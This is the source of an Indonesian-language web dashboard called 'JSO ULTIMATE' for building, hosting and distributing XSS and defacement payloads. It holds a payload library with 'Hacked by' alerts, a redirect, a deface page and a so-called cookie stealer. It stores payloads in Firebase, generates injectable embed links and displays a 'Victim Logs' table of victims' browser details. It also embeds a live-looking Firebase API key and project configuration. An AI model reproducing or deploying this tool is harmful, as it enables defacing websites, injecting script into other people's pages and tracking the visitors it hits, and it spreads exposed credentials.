<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JSO ULTIMATE | SMK Indonesia</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap"
        rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <style>
        :root {
            --bg: #0b0f1a;
            --card: #1e293b;
            --accent: #ff3e3e;
            --border: rgba(255, 255, 255, 0.1);
            --text-dim: #94a3b8;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Plus Jakarta Sans', sans-serif;
        }

        body {
            background-color: var(--bg);
            background-image: radial-gradient(circle at 50% 50%, #1e0a0a 0%, #0b0f1a 100%);
            color: #fff;
            padding: 20px 5%;
        }

        .grid-container {
            display: grid;
            grid-template-columns: 1fr 1.5fr;
            gap: 20px;
        }

        .card {
            background: rgba(30, 41, 59, 0.5);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            border: 1px solid var(--border);
            padding: 20px;
            margin-bottom: 20px;
        }

        h1 span {
            color: var(--accent);
        }

        h3 {
            margin-bottom: 15px;
            font-size: 14px;
            text-transform: uppercase;
            color: var(--accent);
        }

        /* Form & Input */
        input,
        textarea {
            width: 100%;
            padding: 12px;
            background: rgba(15, 23, 42, 0.8);
            border: 1px solid var(--border);
            border-radius: 8px;
            color: #fff;
            outline: none;
            margin-bottom: 10px;
        }

        textarea {
            font-family: 'Courier New', monospace;
            color: #22c55e;
        }

        .btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            font-weight: 800;
            cursor: pointer;
            transition: 0.3s;
        }

        .btn-primary {
            background: var(--accent);
            color: white;
        }

        /* Preview Box */
        /* Preview Box - Fixed 1:1 Ratio */
        #preview-box {
            background: var(--bg);
            color: var(--text-dim);
            padding: 10px;
            border-radius: 8px;

            /* Ini kuncinya */
            aspect-ratio: 1 / 1;
            width: 100%;
            max-width: 400px;
            /* Batas maksimal agar tidak terlalu raksasa */

            margin: 10px auto;
            overflow: auto;
            /* Jika HTML kepanjangan, muncul scrollbar internal */
            border: 3px solid var(--card);
            display: block;
            position: relative;
        }

        /* Supaya gambar/elemen di dalam preview tidak merusak layout */
        #preview-box * {
            max-width: 100%;
        }

        /* Library Buttons */
        .lib-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 5px;
            margin-bottom: 15px;
        }

        .btn-lib {
            padding: 5px;
            font-size: 10px;
            background: var(--card);
            color: white;
            border: 1px solid var(--border);
            border-radius: 4px;
            cursor: pointer;
        }

        /* Tables */
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
        }

        th {
            text-align: left;
            color: var(--text-dim);
            padding: 8px;
            border-bottom: 1px solid var(--border);
        }

        td {
            padding: 10px 8px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }

        .copy-box {
            background: #0f172a;
            padding: 5px;
            border-radius: 4px;
            color: #22c55e;
            display: flex;
            justify-content: space-between;
        }

        .btn-copy {
            background: var(--accent);
            border: none;
            color: white;
            padding: 2px 6px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 9px;
        }
    </style>
</head>

<body>

    <h1 style="margin-bottom: 20px;">JSO <span>ULTIMATE</span></h1>

    <div class="grid-container">
        <div>
            <div class="card">
                <h3>Payload Library</h3>
                <div class="lib-grid">
                    <button class="btn-lib" onclick="setLib('alert')">Simple Alert</button>
                    <button class="btn-lib" onclick="setLib('redirect')">Redirect</button>
                    <button class="btn-lib" onclick="setLib('deface')">Basic Deface</button>
                    <button class="btn-lib" onclick="setLib('logger')">Cookie Stealer</button>
                </div>

                <h3>Generator</h3>
                <input type="text" id="nama_payload" placeholder="Nama Payload">
                <textarea id="kode_html" rows="8" placeholder="Masukkan HTML/JS..."
                    oninput="updatePreview()"></textarea>
                <button onclick="simpanData()" class="btn btn-primary">SIMPAN & PUBLISH</button>

                <h3 style="margin-top:20px;">Live Preview</h3>
                <div id="preview-box">Tampilan akan muncul di sini...</div>
            </div>
        </div>

        <div>
            <div class="card">
                <h3>Daftar Payload</h3>
                <table>
                    <thead>
                        <tr>
                            <th>NAMA</th>
                            <th>SCRIPT LINK</th>
                            <th>AKSI</th>
                        </tr>
                    </thead>
                    <tbody id="table-body"></tbody>
                </table>
            </div>

            <div class="card">
                <h3>Victim Logs (Jejak Korban)</h3>
                <table>
                    <thead>
                        <tr>
                            <th>PAYLOAD</th>
                            <th>INFO KORBAN</th>
                            <th>WAKTU</th>
                        </tr>
                    </thead>
                    <tbody id="log-body"></tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBe2FZl6ELHU_wnUp9GV_fI9xN75goKVgk",
            authDomain: "user-e9bb1.firebaseapp.com",
            databaseURL: "https://user-e9bb1-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "user-e9bb1",
            storageBucket: "user-e9bb1.firebasestorage.app",
            messagingSenderId: "366338619092",
            appId: "1:366338619092:web:2c2ca964544193e523ed41",
            measurementId: "G-0229YGTK19"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // 1. Live Preview
        function updatePreview() {
            const code = document.getElementById('kode_html').value;
            document.getElementById('preview-box').innerHTML = code;
        }

        // 2. Payload Library
        function setLib(type) {
            const libs = {
                alert: "<script>alert('Hacked by SMK Indonesia!');<\/script>",
                redirect: "<script>window.location='https://google.com';<\/script>",
                deface: "<body style='background:black;color:red;text-align:center;'><h1>HACKED BY ME</h1></body>",
                logger: "<script>alert('Your Cookie: ' + document.cookie);<\/script>"
            };
            document.getElementById('kode_html').value = libs[type];
            updatePreview();
        }

        // 3. Simpan & Tampil
        function simpanData() {
            const nama = document.getElementById('nama_payload').value;
            const html = document.getElementById('kode_html').value;
            if (!nama || !html) return Swal.fire('Error', 'Isi dulu bos!', 'error');
            db.ref('payloads').push({ nama, isi: html }).then(() => {
                Swal.fire('Berhasil!', '', 'success');
                document.getElementById('nama_payload').value = '';
                document.getElementById('kode_html').value = '';
            });
        }

        db.ref('payloads').on('value', snap => {
            const tbody = document.getElementById('table-body');
            tbody.innerHTML = '';
            snap.forEach(child => {
                const link = window.location.origin + "/render.html?id=" + child.key;
                tbody.innerHTML += `<tr>
                    <td>${child.val().nama}</td>
                    <td><div class="copy-box"><span id="${child.key}">${link}</span><button class="btn-copy" onclick="copy('${child.key}')">COPY</button></div></td>
                    <td><button onclick="db.ref('payloads/${child.key}').remove()" style="color:red;border:none;background:none;cursor:pointer">Hapus</button></td>
                </tr>`;
            });
        });

        // 4. Victim Logs
        db.ref('logs').on('value', snap => {
            const logBody = document.getElementById('log-body');
            logBody.innerHTML = '';
            snap.forEach(child => {
                child.forEach(log => {
                    const data = log.val();
                    logBody.innerHTML += `<tr>
                        <td>${child.key.substring(0, 5)}...</td>
                        <td>${data.agent.substring(0, 30)}...</td>
                        <td>${data.time}</td>
                    </tr>`;
                });
            });
        });

        function copy(id) {
            const txt = document.getElementById(id).innerText;
            navigator.clipboard.writeText(`<inframe src="${txt}"><\/inframe>`);
            Swal.fire({ toast: true, position: 'top-end', title: 'Script Tag Disalin!', showConfirmButton: false, timer: 1000, icon: 'success' });
        }
    </script>
</body>


</html>
